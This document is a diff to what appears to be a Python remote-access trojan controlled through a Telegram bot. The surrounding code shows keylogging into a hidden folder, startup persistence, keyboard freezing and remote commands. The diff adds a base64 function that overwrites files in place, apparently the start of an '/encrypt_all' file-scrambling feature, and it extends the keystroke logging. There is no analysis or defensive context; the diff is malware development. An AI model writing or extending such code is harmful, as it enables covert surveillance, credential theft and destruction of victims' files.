@@ -8,6 +8,7 @@ from winshell import startup 						# persistence
 from tendo import singleton							# this makes the application exit if there's another instance already running
 from win32com.client import Dispatch				# used for WScript.Shell
 from time import strftime, sleep					
+import base64										# /encrypt_all
 import datetime										# /schedule
 import time
 import threading 									# /proxy, /schedule
@@ -49,7 +50,6 @@ mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 schedule = {}
 log_file = hide_folder + '\\keylogs.txt'
-hookManager = pyHook.HookManager()
 # functionalities dictionary: command:arguments
 functionalities = { '/arp' : '', \
 					'/capture_pc' : '', \
@@ -75,6 +75,15 @@ functionalities = { '/arp' : '', \
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
+def encode(file):
+	f = open(file)
+	data = f.read()
+	f.close()
+	string = base64.b64encode(data)
+	#convert = base64.b64decode(string)
+	t = open(file, "w+")
+	t.write(string)
+	t.close()
 def runStackedSchedule(everyNSeconds):
 	for k in schedule.keys():
 		if k < datetime.datetime.now():
@@ -100,6 +109,8 @@ def pressed_chars(event):
 			print tofile
 		else:
 			stdout.write(tofile)
+		f.write(tofile)
+		f.close()
 	return not keyboardFrozen
 
 def split_string(n, st):
@@ -173,7 +184,7 @@ def handle(msg):
 						except:
 							response = 'Could not find ' + path_file
 			elif command == '/encrypt_all': #WIP
-				response = 'Not implemented yet'
+				response = 'Not implemented'
 			elif command.endswith('freeze_keyboard'):
 				global keyboardFrozen
 				keyboardFrozen = not command.startswith('/un')
@@ -387,6 +398,7 @@ if len(known_ids) > 0:
 	for known_id in known_ids:
 		bot.sendMessage(known_id, helloWorld)
 print 'Listening for commands on ' + platform.uname()[1] + '...'
+hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
 hookManager.HookKeyboard()
 pythoncom.PumpMessages()
